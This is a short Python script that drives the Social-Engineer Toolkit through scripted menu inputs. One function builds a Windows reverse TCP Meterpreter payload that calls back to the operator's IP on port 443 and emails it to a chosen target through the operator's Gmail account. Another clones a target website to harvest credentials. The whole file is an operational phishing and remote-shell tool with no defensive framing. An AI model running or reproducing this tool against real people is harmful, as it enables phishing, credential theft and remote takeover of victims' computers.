import subprocess

def run_setoolkit(commands):
    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, errors = process.communicate(input="".join(commands))
    print(output)
    if errors:
        print(errors)

def email_phishing():
    ip = input("Your IP to listen to the shell: ")
    targetmail = input("Mail of target?: ")
    mail = input("Your Gmail?: ")
    password = input("Gmail password?: ")
    filename = input("What should the file be called?: ")

    commands = [
        "1\n",  # Social-Engineering Attacks
        "1\n",  # Spear-Phishing Attack Vectors
        "1\n",  # Perform a Mass Email Attack
        "13\n",  # Create a FileFormat Payload
        "2\n",  # Windows Reverse_TCP Meterpreter
        "1\n",  # Windows Reverse_TCP Meterpreter
        f"{ip}\n",  # IP Address
        "443\n",  # Port
        "2\n",  # Create a Payload and Listener
        f"{filename}\n",  # Payload name
        "1\n",  # Use a built-in email attack
        "1\n",  # Single Email Address
        "3\n",  # GMail
        f"{targetmail}\n",  # Target email
        "1\n",  # Send email
        f"{mail}\n",  # Your email
        "test\n",  # Email subject
        f"{password}\n",  # Email password
        "yes\n",  # Send email
        "yes\n",  # Are you sure?
        "no\n"   # Do you want to send another email?
    ]
    
    run_setoolkit(commands)

def clone_page():
    url = input("Target URL?: ")

    commands = [
        "2\n",  # Website Attack Vectors
        "3\n",  # Credential Harvester Attack Method
        "2\n",  # Site Cloner
        f"{url}\n"  # URL to clone
    ]

    run_setoolkit(commands)

def main():
    option = input("Do you want to phish using 1. email, 2. phone nr., or 3. clone page?: ")

    if option == "1":
        email_phishing()
    elif option == "2":
        print("Phone number phishing is not implemented.")
    elif option == "3":
        clone_page()
    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()

